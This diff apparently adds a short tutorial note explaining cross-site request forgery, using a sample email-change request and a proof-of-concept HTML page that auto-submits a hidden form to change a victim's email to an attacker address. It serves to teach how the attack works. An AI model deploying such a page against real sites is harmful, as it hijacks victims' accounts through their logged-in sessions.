@@ -1,0 +1,41 @@
+CSRF is a web vulnerability where the attacker can induces targeted victims to perform attacker's actions on the victim's
+behalf.
+how does it work
+to perform the successful CSRF attack three conditions must be satisfied 
+1. privileged actions
+2. Cookie-based session handling
+3.doesn't contain any unpredictable parameter
+
+Lets take an example of an HTTP request where an user wants to change his email address//
+
+POST /email/change HTTP/1.1 
+Host: sthakapil.com.np
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE
+
+email=admin@sthakapil.com.np
+
+
+so as stated in no.1,this action subjets to attacker's interest where an user wants his email address to be changed
+The application uses a session cookie to identify which user issued the request.and The attacker can easily determine the values of
+the request parameters that are needed to perform the action. 
+
+so now the attacker can construct a web page containing the malicious code which executes upon the user's interecation, 
+<html>
+    <body>
+        <form action="https://sthakapil.com.np/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+          </body>
+</html>
+
+ If a victim user visits the attacker's web page, the following will happen:
+
+    The attacker's page will trigger an HTTP request to the sthakapil.com.np web site.
+    If the user is logged in to the sthakapil.com.np, their browser will automatically include their session cookie in the request
+    (assuming SameSite cookies are not being used).
+    The web site will process the request in the normal way, treat it as having been made by the victim user, and change their email address.
